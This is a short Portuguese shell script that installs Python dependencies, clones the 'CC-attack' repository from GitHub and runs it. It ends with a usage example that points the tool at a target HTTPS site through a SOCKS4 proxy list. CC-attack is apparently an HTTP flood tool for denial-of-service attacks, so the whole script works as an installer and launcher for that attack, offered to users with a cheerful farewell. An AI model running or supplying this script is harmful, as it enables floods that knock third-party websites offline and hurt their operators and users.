echo "*LIMPANDO TERMINAL" | figlet | lolcat
sleep 1
clear
echo "*INSTALANDO DEPEDENCIAS PIP...." | figlet | lolcat
echo "Aguarde o fim do processo, por favor..." | lolcat
pip install --upgrade pip
pip3 install requests pysocks
clear
echo "BAIXANDO: CC-ATTACK" | figlet | lolcat
echo "(isso pode demorar um pouco)" | lolcat
cd $HOME/foxys_blt/downloads
git clone https://github.com/Leeon123/CC-attack.git
clear
echo "FINALIZADO, EXECUTANDO SCRIPT :)" | figlet | lolcat
cd CC-attack
python3 cc.py
echo "Como usar essa ferramneta?"| lolcat
echo "Siga o Exemplo abaixo" | lolcat
echo "python3 cc.py -url (site https) -f socks4.txt -v 4 -s 30" | lolcat
echo "Obrigado por usar nossa plataforma, volte sempre" | lolcat
